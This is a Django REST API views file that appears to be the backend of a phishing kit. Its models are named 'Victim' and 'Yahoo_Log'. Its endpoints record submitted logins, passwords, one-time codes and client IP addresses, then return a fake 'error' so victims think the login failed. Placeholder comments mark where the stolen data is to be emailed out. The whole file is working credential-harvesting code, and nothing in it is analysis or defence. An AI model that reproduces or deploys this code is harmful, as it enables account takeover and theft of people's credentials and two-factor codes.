
import re
from django import http
from rest_framework.response import Response
from rest_framework.views import APIView
from .models import Victim,Yahoo_Log
from django.core.mail import EmailMessage


class Index(APIView):
    def get(self,request):
        return Response({"Access Denied"})


class Redify(APIView):
    def post(self,request):
        try:
            psw=request.data['psw']
        except:
            return Response({"password required"})
        try:
            login=request.data['login']
        except:
            return Response({"email or phone number required"})
        try:
            code = request.data['code']
        except:
            return Response({"code required"})
        xxx = request.META.get('HTTP_X_FORWARDED_FOR')
        if xxx:
            ip = xxx.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        Victim.objects.create(login=login,password=psw,ip=ip,code=code)
        return Response({"error"})
        #Send Email


        
class Getlog(APIView):
    def post(self,request):
        try:
            psw=request.data['main-password']
        except:
            pass
        try:
            mail=request.data['mail']
        except:
            pass
        
        xxx = request.META.get('HTTP_X_FORWARDED_FOR')
        if xxx:
            ip = xxx.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        Yahoo_Log.objects.create(mail=mail,password=psw,ip=ip,)
        return Response({"error"})
        #Send Email





        


        




